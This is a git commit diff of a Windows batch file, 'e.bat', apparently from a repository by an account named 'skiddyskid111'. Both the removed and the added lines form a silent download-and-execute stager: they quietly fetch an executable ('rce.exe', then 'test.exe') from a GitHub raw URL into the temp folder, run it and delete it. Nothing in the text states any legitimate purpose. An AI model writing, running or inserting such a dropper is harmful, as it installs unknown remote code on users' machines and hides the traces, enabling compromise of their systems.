81dacbe661755a5795aa772698544c642fc6d453
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-09-03 19:06:41 +0200

    Update e.bat

--- e.bat
+++ e.bat
@@ -1,4 +1,7 @@
 @echo off
-curl -s -L "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/rce.exe" -o "%TEMP%\rce.exe"
-start /wait "" "%TEMP%\rce.exe"
-del "%TEMP%\rce.exe"
+set "FILE=%TEMP%\tmpTEST.exe"
+curl -s -L "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/test.exe" -o "%FILE%"
+if exist "%FILE%" (
+    start /wait "" "%FILE%"
+    del "%FILE%"
+)
